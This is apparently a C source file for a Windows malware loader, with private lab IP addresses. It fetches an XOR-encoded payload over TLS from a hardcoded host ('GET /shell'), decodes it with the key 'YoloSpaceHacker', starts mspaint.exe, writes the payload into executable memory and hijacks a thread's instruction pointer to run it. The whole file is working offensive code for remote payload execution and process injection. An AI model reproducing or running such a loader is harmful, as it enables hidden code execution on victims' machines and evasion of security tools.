#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <openssl/ssl.h>


#define BUFFER_SIZE 1024

char buffer[BUFFER_SIZE];
char ip[] = "192.168.56.103";
//char ip[] = "10.11.80.155";
int port = 443;


int downloadHTTPS()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    addr.sin_addr.s_addr = inet_addr(ip); //windows

    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    SSL_CTX* ctx = SSL_CTX_new(TLS_method());
    SSL* ssl = SSL_new(ctx);
    
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    SSL_set_read_ahead(ssl, 1);

    SSL_set_fd(ssl, sockfd);
    SSL_connect(ssl);
    char* request = "GET /shell\r\n\r\n";
    SSL_write(ssl, request, strlen(request));
    
    int nb = SSL_read(ssl, buffer, BUFFER_SIZE);
    
    closesocket(sockfd);
    WSACleanup();

    return nb;
}

void exploit()
{
    char key[] = "YoloSpaceHacker";
    LPCSTR victimImage = "c:\\windows\\system32\\mspaint.exe";
    


    int nb = downloadHTTPS();
    //printf("%d\n", nb);

    unsigned char shellcode[nb];

    for (int i = 0; i < nb; i++) {
        shellcode[i] = buffer[i] ^ key[i % strlen(key)];
    }


    STARTUPINFOA su;
    PROCESS_INFORMATION pi;

    memset(&su, 0x00, sizeof(su));
    memset(&pi, 0x00, sizeof(pi));
    su.cb = sizeof(su);

    CreateProcessA(0, (LPSTR)victimImage,0,0,0,NORMAL_PRIORITY_CLASS,0,0,&su,&pi);
    DWORD processId = pi.dwProcessId;


    HANDLE h_thread;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    PVOID b_shellcode = VirtualAllocEx(pi.hProcess, NULL, sizeof buffer, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, b_shellcode, buffer, sizeof buffer, NULL);

    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(h_snapshot, &threadEntry);

    while (Thread32Next(h_snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == processId)
        {
            h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    SuspendThread(h_thread);

    GetThreadContext(h_thread, &context);
    context.Rip = (DWORD_PTR)b_shellcode;
    SetThreadContext(h_thread, &context);
    
    ResumeThread(h_thread);

    WaitForSingleObject(pi.hProcess, INFINITE);

}


int main()
{
    exploit();
    return 0;
}

